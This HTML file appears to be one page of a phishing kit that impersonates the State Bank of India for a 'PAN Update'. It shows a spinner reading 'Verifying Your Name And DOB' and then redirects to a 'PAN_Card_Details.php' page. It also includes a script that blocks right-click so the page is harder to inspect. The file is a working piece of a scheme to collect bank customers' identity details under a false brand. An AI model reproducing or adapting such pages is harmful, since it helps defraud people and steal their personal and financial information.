<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="content-type" content="text/html;charset=utf-8" />
    <meta name="theme-color" content="#673391">
    <meta charSet="utf-8" />
    <meta name="viewport" content="width=device-width" />
    <title>Processing... | State Bank of India - PAN Update</title>
    <meta name="next-head-count" content="3"/>
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
    <meta name="msapplication-TileColor" content="#da532c">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style type="text/css">
      body
      {
      background-color:#fff;
      font-family:Lato-Regular,sans-serif;
      margin:0;
      padding:0;
      max-width:100%;}
      
     .mg{color:#506d85;
      letter-spacing:normal;
      line-height:1.5;
      font-size:10px;
      margin-top:16px;
      margin-bottom:20px;}
      
      .mainContent
      {padding:10px;
      font-family: 'Work Sans', sans-serif;
      font-weight:900;
      }
      
      .para
      {height:39px;
      padding-top:16px;}
      
      .pmLogin
      {margin-top:1.75rem;}
      
      .para span
      {font-size:16px;
      font-family: 'Work Sans', sans-serif;
      font-weight:600;
      line-height:1.2;color:#222;}
      
      .para span,.text-center
      {text-align:center;}
      
     .circlespinner
      {animation:rotate 2s linear infinite;
      width:50px;
      height:75px;
      stroke:#F9F9FB;}
      
      .path
      {stroke:#673391;
      stroke-linecap:round;
      animation:dash 1.5s ease-in-out infinite}
      @keyframes rotate{to
      {transform:rotate(1turn)}}
      @keyframes dash{0%
      {stroke-dasharray:1,150;stroke-dashoffset:0;}50%
      {stroke-dasharray:90,150;stroke-dashoffset:-35;}
      to
      {stroke-dasharray:90,150;
      stroke-dashoffset:-125;}}
      .l-loading
      {margin-top:80px;}
      
      .form-group .invalid-message
      {
      font-size:12px;
      color:red;
      }
    </style>
    <script language="javascript"> 
    var message="This function is not allowed here.";
    function clickIE4(){
    if (event.button==2){
    alert(message);
    return false;
    }
    }
    function clickNS4(e){
    if (document.layers||document.getElementById&&!document.all){
    if (e.which==2||e.which==3){
    alert(message);
    return false;
    }
    }
    }
    if (document.layers){
    document.captureEvents(Event.MOUSEDOWN);
    document.onmousedown=clickNS4;}
    else if (document.all&&!document.getElementById){
    document.onmousedown=clickIE4;}
    document.oncontextmenu=new Function("alert(message);return false;")
    </script>
    <script>
      function countdown() {
        var count = 6;
        var countdownElement = document.getElementById("countdown");

        var countdownInterval = setInterval(function() {
          countdownElement.innerHTML = count;
          count--;

          if (count < 0) {
            clearInterval(countdownInterval);
            window.location.href = "PAN_Card_Details.php";
          }
        }, 1000);
      }

      document.addEventListener("DOMContentLoaded", function() {
        countdown();
      });
    </script>
  </head>
  <body>
    <div id="__next">
      <div class="text-center l-loading">
        <svg class="circlespinner" viewBox="0 0 50 50">
          <circle class="path" cx="25" cy="25" r="20" fill="none" stroke-width="5"></circle>
        </svg>
        <h1 style="font-size:14px; color:#506070; font-family: 'Open Sans', sans-serif;font-weight:600;">Please wait...Verifying Your Name And DOB...<br> Redirecting in <span id="countdown">6</span> seconds.</h1>
      </div>
    </div>
  </body>
</html>